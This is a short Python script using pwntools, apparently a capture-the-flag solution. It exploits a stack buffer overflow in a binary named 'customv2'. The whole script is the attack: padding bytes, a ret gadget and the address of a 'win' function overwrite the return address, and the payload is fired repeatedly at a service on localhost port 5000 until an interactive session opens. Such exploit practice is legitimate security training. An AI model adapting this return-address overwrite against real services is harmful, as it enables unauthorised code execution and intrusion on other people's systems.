from pwn import *

context.binary = elf = ELF("customv2")

payload = b'a' * 64 + pack(0) + b'a' * 16 + pack(0x000000000040101a) + pack(elf.symbols['win'])

while True:
    try:
        # p = process()
        p = remote("localhost", 5000)
        p.sendlineafter(b'> ', payload)
        res = p.clean()
        if(b'Buffer' not in res):
            p.interactive()
        p.close()
    except EOFError:
        pass